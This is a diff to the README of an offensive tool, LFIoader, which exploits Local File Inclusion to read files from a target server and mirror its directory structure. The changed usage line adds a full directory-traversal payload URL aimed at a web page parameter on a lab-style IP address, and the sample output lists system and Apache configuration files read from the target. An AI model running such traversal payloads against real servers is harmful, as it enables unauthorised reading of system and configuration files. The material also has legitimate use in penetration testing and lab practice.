@@ -3,7 +3,7 @@
 Enumerates readable files via Local File Inclusion and mimics the directory structure of the system beeing read. 
 
 ```bash
-root@kali:/tmp# (proxychains -q) python LFIoader.py
+root@kali:/tmp# (proxychains -q) python LFIoader.py -u 'http://10.10.10.10/nav.php?page=../../../../../../../../../../../'
 [Succcess][/boot/grub/grub.cfg]
 [Succcess][/etc/adduser.conf]
 [Succcess][/etc/apache2/apache2.conf]
